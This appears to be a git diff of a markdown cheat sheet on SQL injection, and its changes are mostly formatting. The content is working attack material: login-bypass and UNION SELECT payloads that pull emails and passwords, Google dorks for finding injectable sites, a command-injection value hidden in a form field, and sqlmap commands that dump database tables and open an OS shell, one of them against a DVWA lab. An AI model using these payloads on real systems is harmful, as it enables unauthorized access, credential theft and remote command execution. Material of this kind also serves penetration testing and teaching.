@@ -1,15 +1,11 @@
 # SQL Injection
 
-
-**Check for SQLi by adding and single quote or the following: 
+**Check for SQLi by adding and single quote or the following:   
 **
 
 ```
 ‘ or 1=1--<space>
-
 ```
-
-
 
 ```
 http://www.target.com/index.php?val=100’
@@ -19,9 +15,7 @@ Username: ' or 1=1--<space>
 Password:
 ```
 
-
-
-**Try to login as a specific user.
+**Try to login as a specific user.  
 **
 
 ```
@@ -29,27 +23,24 @@ Username: bob
 Password: ' or (1=1 and username = 'bob')--<space>
 ```
 
-
-
-**Database version
+**Database version  
 **
 
 ```
 Username: +convert(varchar,convert(int,@@version))+
 ```
 
-
 ### Google Dorks
 
-inurl:index.php?id=
-inurl:gallery.php?id=
-inurl:article.php?id=
+inurl:index.php?id=  
+inurl:gallery.php?id=  
+inurl:article.php?id=  
 inurl:pageid=
 
-SQL databases interpret the single quote character as the boundary between code and data. It assumes that
-anything following a single quote is code that it needs to run and anything encapsulated by a quote is data.
 
 
+> SQL databases interpret the single quote character as the boundary between code and data. It assumes that  
+> anything following a single quote is code that it needs to run and anything encapsulated by a quote is data.
 
 ```
 Example: SELECT * FROM products WHERE price < '100' ORDER BY description;
@@ -61,11 +52,7 @@ Example: SELECT * FROM products WHERE price < '100' ORDER BY description;
 ' GROUPED BY productid,name having '1'='1
 ```
 
-
-
 MS-SQL server concatenates numbers, it does not add them. '10' + '0' would equal 100 not 10.
-
-
 
 ```
 SELECT * FROM table1 WHERE condition1
@@ -80,23 +67,16 @@ OS - @@version
         Columns
 
 SELECT name FROM master..sysdatabases
-
 ```
 
-
-
 ```
-
 http://target.com/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))—
 http://target.com/article.aspx?article_id=0+UNION+SELECT+EMAIL,+USERID,+PASSWORD+FROM+USERS
 Newsletter signup > Subscribe:  joe@gmail.com & ipconfig > C:\inetpub\wwwroot\Book\test.txt
 ```
 
-
-
-**Use Burp to trap a request. Copy the request to /root/tmp.
+**Use Burp to trap a request. Copy the request to /root/tmp.  
 **
-
 
 ```
 sqlmap -r /root/tmp
@@ -107,13 +87,9 @@ sqlmap -r /root/tmp -D <database> --tables               Show all tables in db
 sqlmap -r /root/tmp -D <database> -T <table> --dump      Show all data in table
 ```
 
-
-
-From: http://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/
-
+From: [http://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/](http://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/)
 
 ```
-
 sqlmap.py --url=”http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#”
 --cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee"
 
@@ -133,5 +109,6 @@ sqlmap.py --url="http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
 sqlmap.py --url="http://target.com/login.asp" --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login"
 --os-shell
 ```
+
 
 
